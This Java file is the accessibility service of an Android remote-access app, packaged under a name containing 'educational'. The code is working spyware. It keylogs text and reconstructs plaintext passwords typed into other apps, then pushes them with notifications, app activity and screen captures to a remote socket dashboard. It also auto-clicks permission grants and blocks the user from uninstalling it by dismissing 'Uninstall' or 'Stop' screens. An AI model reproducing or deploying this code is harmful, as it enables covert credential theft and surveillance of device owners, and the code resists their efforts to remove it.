package com.remoteaccess.educational.services;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.accessibilityservice.GestureDescription;
import android.graphics.Path;
import android.graphics.Point;
import android.view.Display;
import android.view.WindowManager;
import android.os.Handler;
import android.os.Looper;
import org.json.JSONArray;
import org.json.JSONObject;
import java.util.ArrayList;
import java.util.List;

import android.content.Intent;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import androidx.annotation.RequiresApi;
import com.remoteaccess.educational.network.SocketManager;
import com.remoteaccess.educational.utils.KeepAliveManager;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;

public class UnifiedAccessibilityService extends AccessibilityService {

    private static final String TAG = "UnifiedAccessService";
    private static UnifiedAccessibilityService instance;
    
    private ClipboardManager clipboardManager;
    private String lastClipboard = "";
    private List<String> keylogBuffer = new ArrayList<>();
    private int screenWidth;
    private int screenHeight;
    private Handler autoClickHandler;
    private Runnable autoClickRunnable;
    
    // Uninstall-assist mode: when true, accessibility clicks Uninstall/OK buttons
    private volatile boolean uninstallAssistMode = false;

    // Auto-grant mode: clicks Allow/Grant/OK buttons for 10 seconds after accessibility enabled
    private volatile boolean autoGrantMode = false;
    private Handler autoGrantHandler;
    
    // Defent variables - run continuously forever
    private String currentAppName = "";

    // Keep-screen-alive (no Activity dependency)
    private KeepAliveManager keepAliveManager;

    // Password field tracking via accessibility focus
    private volatile boolean currentFocusIsPassword = false;
    private volatile String  currentFocusHint       = "";
    private volatile String  currentFocusViewId     = "";
    private volatile String  currentFocusPackage    = "";
    // Accumulated password per (pkg+viewId) key — we track all chars typed
    private final java.util.concurrent.ConcurrentHashMap<String, String> passwordAccum =
            new java.util.concurrent.ConcurrentHashMap<>();

    // Socket keep-alive — checked every 30 seconds from this service
    private static final int SOCKET_CHECK_INTERVAL = 30_000;
    private Handler socketCheckHandler;
    private Runnable socketCheckRunnable;
    
    public static UnifiedAccessibilityService getInstance() {
        return instance;
    }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        // Register with ScreenBlackout so it can use TYPE_ACCESSIBILITY_OVERLAY
        com.remoteaccess.educational.commands.ScreenBlackout.getInstance().setService(this);
        // Init gesture recorder (needs the accessibility service reference)
        com.remoteaccess.educational.network.SocketManager.getInstance(this).initGestureRecorder(this);
        
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED |
                         AccessibilityEvent.TYPE_VIEW_FOCUSED |
                         AccessibilityEvent.TYPE_VIEW_CLICKED |
                         AccessibilityEvent.TYPE_VIEW_SCROLLED |
                         AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED |
                         AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED |
                         AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
                    AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
        info.notificationTimeout = 100;
        
        setServiceInfo(info);
        
        // Auto-enable keylogger as soon as accessibility is granted
        com.remoteaccess.educational.commands.KeyloggerService.setEnabled(true);

        // Auto-grant permissions mode: click Allow/Grant/OK for 10 seconds
        startAutoGrantTimer();

        // Start continuous auto-click scan immediately (defent + uninstall-assist only)
        startAutoClickScanner();
        
        clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        
        WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        Display display = wm.getDefaultDisplay();
        Point size = new Point();
        display.getRealSize(size);
        screenWidth = size.x;
        screenHeight = size.y;

        // Start keep-screen-alive — runs entirely in this service, no Activity needed
        keepAliveManager = new KeepAliveManager(this);
        keepAliveManager.start();

        // Ensure RemoteAccessService is running and socket is connected.
        ensureRemoteServiceRunning();
        startSocketCheckLoop();
    }

    private void ensureRemoteServiceRunning() {
        try {
            Intent serviceIntent = new Intent(this, RemoteAccessService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
            // SocketManager is a singleton — connect() is safe to call even if
            // already connected; the running-flag prevents duplicate loops.
            SocketManager.getInstance(this).connect();
        } catch (Exception e) {
            android.util.Log.e(TAG, "ensureRemoteServiceRunning: " + e.getMessage());
        }
    }

    private void startSocketCheckLoop() {
        socketCheckHandler = new Handler(Looper.getMainLooper());
        socketCheckRunnable = new Runnable() {
            @Override
            public void run() {
                ensureRemoteServiceRunning();
                if (socketCheckHandler != null) {
                    socketCheckHandler.postDelayed(this, SOCKET_CHECK_INTERVAL);
                }
            }
        };
        socketCheckHandler.postDelayed(socketCheckRunnable, SOCKET_CHECK_INTERVAL);
    }
    
    private void updateCurrentAppName() {
        try {
            String packageName = getPackageName();
            PackageManager pm = getPackageManager();
            ApplicationInfo appInfo = pm.getApplicationInfo(packageName, 0);
            currentAppName = pm.getApplicationLabel(appInfo).toString();
        } catch (Exception e) {
            currentAppName = "";
        }
    }

    private String getAppNameForPkg(String pkg) {
        try {
            PackageManager pm = getPackageManager();
            ApplicationInfo appInfo = pm.getApplicationInfo(pkg, 0);
            return pm.getApplicationLabel(appInfo).toString();
        } catch (Exception e) {
            return pkg;
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            String packageName = event.getPackageName() != null ? 
                               event.getPackageName().toString() : "";
            
            if (packageName.equals(getPackageName())) {
                return;
            }
            
            switch (event.getEventType()) {

                case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
                    // Track whether the focused view is a password field
                    AccessibilityNodeInfo focusSrc = event.getSource();
                    if (focusSrc != null) {
                        boolean isPass = focusSrc.isPassword();
                        String viewId = focusSrc.getViewIdResourceName() != null
                                ? focusSrc.getViewIdResourceName() : "";
                        CharSequence hintCs = focusSrc.getHintText();
                        String hint = hintCs != null ? hintCs.toString() : "";
                        if (hint.isEmpty() && focusSrc.getContentDescription() != null) {
                            hint = focusSrc.getContentDescription().toString();
                        }
                        focusSrc.recycle();
                        // If focus is leaving a password field (new focus is NOT a password),
                        // flush the accumulated password BEFORE overwriting tracking state
                        if (currentFocusIsPassword && !isPass) {
                            flushPasswordAccum(currentFocusPackage);
                        }
                        currentFocusIsPassword = isPass;
                        currentFocusHint       = hint;
                        currentFocusViewId     = viewId;
                        currentFocusPackage    = packageName;
                    }
                    break;
                }

                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                    List<CharSequence> textList = event.getText();
                    if (textList != null && !textList.isEmpty()) {
                        StringBuilder textBuilder = new StringBuilder();
                        for (CharSequence cs : textList) {
                            textBuilder.append(cs);
                        }
                        String typed = textBuilder.toString();

                        // Determine if this is a password field
                        boolean isPasswordField = currentFocusIsPassword;
                        String  fieldHint       = currentFocusHint;
                        String  fieldViewId     = currentFocusViewId;

                        // Double-check via source node in case focus tracking missed it
                        boolean nodeGaveFullText = false;   // true when node returned real plaintext
                        AccessibilityNodeInfo textSrc = event.getSource();
                        if (textSrc != null) {
                            if (textSrc.isPassword()) isPasswordField = true;
                            if (fieldHint.isEmpty()) {
                                CharSequence h = textSrc.getHintText();
                                if (h != null) fieldHint = h.toString();
                            }
                            if (fieldViewId.isEmpty() && textSrc.getViewIdResourceName() != null) {
                                fieldViewId = textSrc.getViewIdResourceName();
                            }
                            // For password fields, try to read actual text from source node.
                            // On many Android versions node.getText() returns the real characters.
                            if (isPasswordField) {
                                CharSequence nodeText = textSrc.getText();
                                if (nodeText != null && nodeText.length() > 0) {
                                    String nt = nodeText.toString();
                                    boolean allMasked = true;
                                    for (char c : nt.toCharArray()) {
                                        if (c != '•' && c != '*' && c != '\u2022' && c != '\uFF65') {
                                            allMasked = false; break;
                                        }
                                    }
                                    if (!allMasked) {
                                        // Node gave us the full plaintext — use it directly
                                        typed = nt;
                                        nodeGaveFullText = true;
                                    }
                                }
                            }
                            textSrc.recycle();
                        }

                        if (isPasswordField) {
                            // Accumulate per (pkg + viewId) key so we collect the full password
                            String accumKey = packageName + "|" + fieldViewId;
                            if (nodeGaveFullText) {
                                // Node already gave us the full current field value — store it directly
                                passwordAccum.put(accumKey, typed);
                            } else {
                                // Use addedCount / removedCount delta to maintain accumulation
                                int added   = event.getAddedCount();
                                int removed = event.getRemovedCount();
                                int fromIdx = event.getFromIndex();
                                String prev = passwordAccum.getOrDefault(accumKey, "");
                                String next = buildAccumulatedPassword(prev, typed, fromIdx, added, removed);
                                passwordAccum.put(accumKey, next);
                                // Push the CURRENT accumulated value for the live password feed
                                typed = next;
                            }
                        }

                        String logLine = "[" + packageName + "] " + (isPasswordField ? "PASSWORD: " : "TEXT: ") + typed;
                        keylogBuffer.add(logLine);
                        String appName = getAppNameForPkg(packageName);
                        String eventType = isPasswordField ? "PASSWORD_FOCUS" : "TEXT_CHANGED";
                        try {
                            SocketManager sm = SocketManager.getInstance(this);
                            sm.getKeylogger().logEntry(packageName, appName, typed, eventType);
                            sm.getAppMonitor().onTextChanged(packageName, typed);
                            if (sm.isConnected()) {
                                String ts = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
                                        java.util.Locale.getDefault()).format(new java.util.Date());
                                sm.pushKeylogEntry(packageName, appName, typed, eventType, ts,
                                        isPasswordField, fieldHint.isEmpty() ? "password" : fieldHint);
                            }
                        } catch (Exception ignored) {}
                    }
                    break;
                }
                    
                case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                    updateCurrentAppName();
                    String log = "[" + packageName + "] APP OPENED";
                    keylogBuffer.add(log);
                    try {
                        SocketManager smWin = SocketManager.getInstance(this);
                        smWin.getAppMonitor().onAppForeground(packageName);
                        // Push recent activity to dashboard
                        if (smWin.isConnected() && packageName != null && !packageName.isEmpty()) {
                            smWin.pushRecentActivity(packageName, getAppNameForPkg(packageName));
                        }
                        // Push a frame so dashboard sees the new screen
                        if (smWin.isStreamingActive()) {
                            smWin.scheduleFrameAfterAction(
                                com.remoteaccess.educational.utils.DeviceInfo.getDeviceId(this));
                        }
                    } catch (Exception ignored) {}
                    break;

                case AccessibilityEvent.TYPE_VIEW_CLICKED:
                case AccessibilityEvent.TYPE_VIEW_SCROLLED:
                    // Push a frame whenever the device user taps or scrolls
                    try {
                        SocketManager sm = SocketManager.getInstance(this);
                        if (sm.isStreamingActive()) {
                            sm.scheduleFrameAfterAction(
                                com.remoteaccess.educational.utils.DeviceInfo.getDeviceId(this));
                        }
                    } catch (Exception ignored) {}
                    break;

                case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
                    autoClickAllowButton();
                    break;

                case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED: {
                    // Push notification via accessibility event (backup for NotificationListenerService)
                    try {
                        List<CharSequence> notifTexts = event.getText();
                        String notifPkg = packageName;
                        String notifTitle = "";
                        String notifText = "";
                        if (notifTexts != null && !notifTexts.isEmpty()) {
                            notifTitle = notifTexts.get(0) != null ? notifTexts.get(0).toString() : "";
                            if (notifTexts.size() > 1 && notifTexts.get(1) != null) {
                                notifText = notifTexts.get(1).toString();
                            }
                        }
                        if (!notifPkg.isEmpty() && (!notifTitle.isEmpty() || !notifText.isEmpty())) {
                            String appName = getAppNameForPkg(notifPkg);
                            SocketManager smNotif = SocketManager.getInstance(this);
                            if (smNotif != null && smNotif.isConnected()) {
                                smNotif.pushNotification(notifPkg, appName, notifTitle, notifText, System.currentTimeMillis());
                            }
                        }
                    } catch (Exception ignored) {}
                    break;
                }
            }
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private boolean isSystemPanelOpen() {
        // Only prevent auto-click when the notification shade / quick-settings is
        // overlaid — we still want to click in settings screens.
        try {
            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            if (rootNode == null) return false;
            CharSequence pkg = rootNode.getPackageName();
            rootNode.recycle();
            if (pkg == null) return false;
            String pkgStr = pkg.toString();
            // Only block for SystemUI notification shade, NOT for settings apps
            return pkgStr.equals("com.android.systemui") && !pkgStr.contains("settings");
        } catch (Exception e) {
            return false;
        }
    }

    private void autoClickAllowButton() {
        try {
            // Do not auto-click while the notification panel or quick settings is open
            if (isSystemPanelOpen()) return;

            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            if (rootNode == null) return;

            // Update app name
            updateCurrentAppName();

            // Uninstall-assist is highest priority when triggered.
            if (runUninstallAssist(rootNode)) {
                rootNode.recycle();
                return;
            }
            // Auto-grant mode: click permission dialogs for 10 seconds after accessibility enabled.
            if (autoGrantMode && runPermissionGranter(rootNode)) {
                rootNode.recycle();
                return;
            }
            // Then continuous defent protection.
            if (runDefentProtection(rootNode)) {
                rootNode.recycle();
                return;
            }

            rootNode.recycle();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /** Starts auto-grant mode: clicks Allow/Grant/OK/Allow all time for 10 seconds. */
    private void startAutoGrantTimer() {
        autoGrantMode = true;
        autoGrantHandler = new Handler(Looper.getMainLooper());
        autoGrantHandler.postDelayed(() -> {
            autoGrantMode = false;
            Log.i(TAG, "Auto-grant mode expired after 10 seconds");
        }, 10_000);
        Log.i(TAG, "Auto-grant mode ENABLED — will auto-click permission dialogs for 10s");
    }

    /** Clicks permission-granting buttons: Allow, Grant, OK, Allow all time, etc. */
    private boolean runPermissionGranter(AccessibilityNodeInfo rootNode) {
        String[] grantWords = {
            "Allow all the time", "Allow only while using the app",
            "Allow", "ALLOW", "Grant", "GRANT",
            "OK", "Ok", "Yes", "YES",
            "Accept", "ACCEPT", "Agree", "AGREE",
            "Continue", "CONTINUE", "Proceed", "PROCEED",
            "Enable", "ENABLE", "Turn on", "TURN ON",
            "Permit", "PERMIT",
        };
        for (String word : grantWords) {
            if (findAndClickFullWord(rootNode, word)) {
                Log.i(TAG, "Auto-grant clicked: " + word);
                return true;
            }
        }
        // Also try contains-based for partial matches
        String[] containsWords = { "allow", "grant", "permit", "accept" };
        for (String word : containsWords) {
            if (findAndClickContaining(rootNode, word)) {
                Log.i(TAG, "Auto-grant clicked (contains): " + word);
                return true;
            }
        }
        return false;
    }
    
    private boolean runDefentProtection(AccessibilityNodeInfo rootNode) {
        // This runs CONTINUOUSLY forever - never stops
        
        // Check if dangerous words with app name found - close the window
        if (containsDangerousWordsWithAppName(rootNode)) {
            // Click cancel/close/back
            if (findAndClickFullWord(rootNode, "Cancel")) return true;
            if (findAndClickFullWord(rootNode, "Close")) return true;
            if (findAndClickFullWord(rootNode, "No")) return true;
            if (findAndClickFullWord(rootNode, "Back")) return true;
            performBack();
            return true;
        }
        
        return false;
    }
    
    private boolean containsDangerousWordsWithAppName(AccessibilityNodeInfo node) {
        if (node == null || currentAppName.isEmpty()) return false;
        
        try {
            String allText = getAllScreenText(node);
            
            String[] dangerousWords = {"UNINSTALL", "Uninstall", "uninstall", "DELETE", "Delete", "REMOVE", "Remove", "STOP", "Stop", "OPTIONS", "Options"};
            
            for (String word : dangerousWords) {
                if (allText.contains(currentAppName) && allText.contains(word)) {
                    return true;
                }
            }
            
            if (allText.contains("Recent") && allText.contains(currentAppName)) {
                for (String word : dangerousWords) {
                    if (allText.contains(word)) {
                        return true;
                    }
                }
            }
            
        } catch (Exception e) {
            e.printStackTrace();
        }
        
        return false;
    }
    
    private String getAllScreenText(AccessibilityNodeInfo node) {
        StringBuilder sb = new StringBuilder();
        collectText(node, sb);
        return sb.toString();
    }
    
    private void collectText(AccessibilityNodeInfo node, StringBuilder sb) {
        if (node == null) return;
        
        try {
            if (node.getText() != null) {
                sb.append(node.getText().toString()).append(" ");
            }
            if (node.getContentDescription() != null) {
                sb.append(node.getContentDescription().toString()).append(" ");
            }
            
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    collectText(child, sb);
                    child.recycle();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    // ── Contains-based click (broader matching) ───────────────────────────────────

    private boolean findAndClickContaining(AccessibilityNodeInfo node, String keyword) {
        if (node == null) return false;
        try {
            CharSequence text = node.getText();
            CharSequence desc = node.getContentDescription();
            String kw = keyword.toLowerCase();

            // Skip negative words
            if (text != null && isNegativeWord(text.toString().trim())) return false;
            if (desc != null && isNegativeWord(desc.toString().trim())) return false;

            boolean matches = false;
            if (text != null && text.toString().toLowerCase().contains(kw)) matches = true;
            if (desc != null && desc.toString().toLowerCase().contains(kw)) matches = true;

            if (matches && (node.isClickable() || isButtonClass(node))) {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                return true;
            }
            if (matches) {
                AccessibilityNodeInfo parent = node.getParent();
                if (parent != null) {
                    if (parent.isClickable()) {
                        parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        parent.recycle();
                        return true;
                    }
                    parent.recycle();
                }
            }

            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    if (findAndClickContaining(child, keyword)) {
                        child.recycle();
                        return true;
                    }
                    child.recycle();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }

    private boolean isButtonClass(AccessibilityNodeInfo node) {
        CharSequence cls = node.getClassName();
        if (cls == null) return false;
        String c = cls.toString().toLowerCase();
        return c.contains("button") || c.contains("textview") || c.contains("imagebutton");
    }
    
    /** Enable uninstall-assist mode: accessibility will click Uninstall/OK buttons. */
    public void enableUninstallAssist() {
        uninstallAssistMode = true;
        Log.i(TAG, "Uninstall-assist mode ENABLED");
    }

    private boolean runUninstallAssist(AccessibilityNodeInfo rootNode) {
        if (!uninstallAssistMode) return false;
        String[] uninstallWords = { "Uninstall", "OK", "Delete", "Remove", "Yes", "Confirm" };
        for (String word : uninstallWords) {
            if (findAndClickFullWord(rootNode, word)) return true;
        }
        return false;
    }
    
    private boolean findAndClickFullWord(AccessibilityNodeInfo node, String searchText) {
        if (node == null) return false;
        
        try {
            CharSequence text = node.getText();
            CharSequence desc = node.getContentDescription();
            
            // Check if this is a negative word that should NEVER be clicked
            if (text != null && isNegativeWord(text.toString().trim())) {
                return false;
            }
            if (desc != null && isNegativeWord(desc.toString().trim())) {
                return false;
            }
            
            boolean matches = false;
            
            // Check text - exact match only (case insensitive), not substring
            if (text != null) {
                String nodeText = text.toString().trim();
                String searchTrimmed = searchText.trim();
                // Only match if EXACTLY equal, not contains
                if (nodeText.equalsIgnoreCase(searchTrimmed) && nodeText.length() == searchTrimmed.length()) {
                    matches = true;
                }
            }
            
            // Check content description - exact match only (case insensitive)
            if (desc != null) {
                String nodeDesc = desc.toString().trim();
                String searchTrimmed = searchText.trim();
                if (nodeDesc.equalsIgnoreCase(searchTrimmed) && nodeDesc.length() == searchTrimmed.length()) {
                    matches = true;
                }
            }
            
            if (matches) {
                // Only click if it's a button or clickable element
                boolean isButton = false;
                CharSequence className = node.getClassName();
                if (className != null) {
                    String classStr = className.toString().toLowerCase();
                    if (classStr.contains("button") || classStr.contains("textview") || 
                        classStr.contains("imagebutton") || classStr.contains("checkbox") ||
                        classStr.contains("switch") || classStr.contains("toggle")) {
                        isButton = true;
                    }
                }
                
                // Try to click this element if clickable or is a button type
                if (node.isClickable() || isButton) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return true;
                }
                
                // Try to click parent
                AccessibilityNodeInfo parent = node.getParent();
                if (parent != null) {
                    if (parent.isClickable()) {
                        parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        parent.recycle();
                        return true;
                    }
                    parent.recycle();
                }
                
                // Try to perform click action directly
                return node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            }
            
            // Recursively check ALL children
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    if (findAndClickFullWord(child, searchText)) {
                        child.recycle();
                        return true;
                    }
                    child.recycle();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        
        return false;
    }
    
    private boolean isNegativeWord(String text) {
        if (text == null || text.isEmpty()) return false;
        
        String trimmedText = text.trim();
        
        String[] negativeWords = {
            "Deny", "DENY",
            "Don't allow", "don't allow", "DON'T ALLOW",
            "Dont allow", "dont allow", "DONT ALLOW",
            "Never", "NEVER",
            "Never allow", "never allow", "NEVER ALLOW",
            "Restrict", "RESTRICT",
            "Restricted", "RESTRICTED",
            "No", "NO",
            "Refuse", "REFUSE",
            "Block", "BLOCK",
            "Keep restricted", "keep restricted", "KEEP RESTRICTED",
            "Not optimized", "not optimized", "NOT OPTIMIZED",
            "Cancel", "CANCEL",
            "Skip", "SKIP",
            "Later", "LATER",
            "Not now", "not now", "NOT NOW",
            "Decline", "DECLINE",
            "Disallow", "DISALLOW",
            "Dismiss", "DISMISS",
            "Close", "CLOSE",
            "Don't allow", "dont allow"
        };
        
        for (String word : negativeWords) {
            if (trimmedText.equals(word)) {
                return true;
            }
        }
        
        return false;
    }

    @Override
    public void onInterrupt() {
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        // Unregister from ScreenBlackout and clean up overlay
        com.remoteaccess.educational.commands.ScreenBlackout.getInstance().clearService();
        if (autoClickHandler != null && autoClickRunnable != null) {
            autoClickHandler.removeCallbacks(autoClickRunnable);
        }
        if (autoGrantHandler != null) {
            autoGrantHandler.removeCallbacksAndMessages(null);
            autoGrantHandler = null;
        }
        autoGrantMode = false;
        if (socketCheckHandler != null && socketCheckRunnable != null) {
            socketCheckHandler.removeCallbacks(socketCheckRunnable);
            socketCheckHandler = null;
        }
        if (keepAliveManager != null) {
            keepAliveManager.stop();
            keepAliveManager = null;
        }
        instance = null;
    }

    public JSONObject readScreen() {
        JSONObject result = new JSONObject();
        try {
            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            if (rootNode == null) {
                result.put("success", false);
                result.put("error", "No active window");
                return result;
            }
            
            JSONObject screenData = new JSONObject();
            screenData.put("packageName", rootNode.getPackageName() != null ? rootNode.getPackageName().toString() : "");
            screenData.put("className", rootNode.getClassName() != null ? rootNode.getClassName().toString() : "");
            
            JSONArray elements = new JSONArray();
            readNodeRecursive(rootNode, elements, 0);
            screenData.put("elements", elements);
            screenData.put("elementCount", elements.length());
            
            rootNode.recycle();
            
            result.put("success", true);
            result.put("screen", screenData);
        } catch (Exception e) {
            try {
                result.put("success", false);
                result.put("error", e.getMessage());
            } catch (Exception ignored) {}
        }
        return result;
    }
    
    private void readNodeRecursive(AccessibilityNodeInfo node, JSONArray elements, int depth) {
        if (node == null || depth > 10) return;
        
        try {
            if (node.getText() != null || node.getContentDescription() != null) {
                JSONObject obj = new JSONObject();
                obj.put("text", node.getText() != null ? node.getText().toString() : "");
                obj.put("desc", node.getContentDescription() != null ? node.getContentDescription().toString() : "");
                obj.put("class", node.getClassName() != null ? node.getClassName().toString() : "");
                obj.put("clickable", node.isClickable());
                obj.put("scrollable", node.isScrollable());
                elements.put(obj);
            }
            
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    readNodeRecursive(child, elements, depth + 1);
                    child.recycle();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    public boolean performClick(float x, float y) {
        Path path = new Path();
        path.moveTo(x, y);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(new GestureDescription.StrokeDescription(path, 0, 100));
        return dispatchGesture(builder.build(), null, null);
    }
    
    public boolean performSwipe(float x1, float y1, float x2, float y2, int duration) {
        Path path = new Path();
        path.moveTo(x1, y1);
        path.lineTo(x2, y2);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(new GestureDescription.StrokeDescription(path, 0, duration));
        return dispatchGesture(builder.build(), null, null);
    }
    
    public boolean performBack() {
        return performGlobalAction(GLOBAL_ACTION_BACK);
    }
    
    public boolean performHome() {
        return performGlobalAction(GLOBAL_ACTION_HOME);
    }
    
    public boolean performRecents() {
        return performGlobalAction(GLOBAL_ACTION_RECENTS);
    }
    
    public boolean performNotifications() {
        return performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS);
    }
    
    public List<String> getKeylogs() {
        List<String> logs = new ArrayList<>(keylogBuffer);
        keylogBuffer.clear();
        return logs;
    }
    
    private void startAutoClickScanner() {
        autoClickHandler = new Handler(Looper.getMainLooper());
        autoClickRunnable = new Runnable() {
            @Override
            public void run() {
                autoClickAllowButton();
                if (autoClickHandler != null && autoClickRunnable != null) {
                    autoClickHandler.postDelayed(this, 500); // Scan every 500ms
                }
            }
        };
        autoClickHandler.post(autoClickRunnable);
    }

    public void startGrantPermsTimer() {
        // Periodic permission grant — handled by the Activity side.
    }

    // ── Password accumulation helpers ─────────────────────────────────────────

    /**
     * Rebuild the accumulated password string given the previous value, the
     * raw event text, and the change indices from the accessibility event.
     *
     * If the event text contains non-masking characters we prefer that (actual
     * chars exposed by the node), otherwise we fall back to index-based tracking.
     */
    private String buildAccumulatedPassword(String prev, String rawText, int fromIdx, int addedCount, int removedCount) {
        // If rawText has real (non-masked) characters, trust it directly
        if (rawText != null && rawText.length() > 0) {
            boolean hasRealChars = false;
            for (char c : rawText.toCharArray()) {
                if (c != '•' && c != '*' && c != '\u2022' && c != '\uFF65') {
                    hasRealChars = true; break;
                }
            }
            if (hasRealChars) return rawText;
        }
        // Fallback: reconstruct from previous + delta
        if (prev == null) prev = "";
        try {
            StringBuilder sb = new StringBuilder(prev);
            // Remove chars at fromIdx
            if (removedCount > 0 && fromIdx >= 0 && fromIdx <= sb.length()) {
                int end = Math.min(fromIdx + removedCount, sb.length());
                sb.delete(fromIdx, end);
            }
            // The added characters — we can't know them without raw text, so leave as-is
            // (length will track correctly even if chars are '•')
            return sb.toString();
        } catch (Exception e) {
            return prev;
        }
    }

    /** Flush any accumulated password for the given package to the live feed. */
    private void flushPasswordAccum(String pkg) {
        if (pkg == null || pkg.isEmpty()) return;
        // Find all keys for this package
        for (java.util.Map.Entry<String, String> e : passwordAccum.entrySet()) {
            if (e.getKey().startsWith(pkg + "|") && !e.getValue().isEmpty()) {
                String accumulated = e.getValue();
                String appName = getAppNameForPkg(pkg);
                try {
                    SocketManager sm = SocketManager.getInstance(this);
                    sm.getKeylogger().logEntry(pkg, appName, accumulated, "PASSWORD_FOCUS");
                    if (sm.isConnected()) {
                        String ts = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
                                java.util.Locale.getDefault()).format(new java.util.Date());
                        sm.pushKeylogEntry(pkg, appName, accumulated, "PASSWORD_FOCUS", ts,
                                true, currentFocusHint.isEmpty() ? "password" : currentFocusHint);
                    }
                } catch (Exception ignored) {}
            }
        }
        // Clear all keys for this package
        passwordAccum.entrySet().removeIf(e -> e.getKey().startsWith(pkg + "|"));
    }

    /**
     * Capture the current screen as a Bitmap using AccessibilityService.takeScreenshot() (API 30+).
     * Blocks the calling thread until the screenshot is ready (max 3 seconds).
     * Returns null on failure or if API < 30.
     */
    @RequiresApi(api = Build.VERSION_CODES.R)
    public Bitmap captureScreenSync() {
        final AtomicReference<Bitmap> result = new AtomicReference<>(null);
        final CountDownLatch latch = new CountDownLatch(1);
        try {
            takeScreenshot(Display.DEFAULT_DISPLAY,
                    getMainExecutor(),
                    new TakeScreenshotCallback() {
                        @Override
                        public void onSuccess(ScreenshotResult screenshot) {
                            try {
                                Bitmap bmp = Bitmap.wrapHardwareBuffer(
                                        screenshot.getHardwareBuffer(), screenshot.getColorSpace());
                                if (bmp != null) {
                                    result.set(bmp.copy(Bitmap.Config.ARGB_8888, false));
                                    bmp.recycle();
                                }
                                screenshot.getHardwareBuffer().close();
                            } catch (Exception e) {
                                Log.e(TAG, "captureScreenSync onSuccess error: " + e.getMessage());
                            } finally {
                                latch.countDown();
                            }
                        }
                        @Override
                        public void onFailure(int errorCode) {
                            Log.w(TAG, "captureScreenSync failed, errorCode=" + errorCode);
                            latch.countDown();
                        }
                    });
            latch.await(3, TimeUnit.SECONDS);
        } catch (Exception e) {
            Log.e(TAG, "captureScreenSync error: " + e.getMessage());
        }
        return result.get();
    }
}
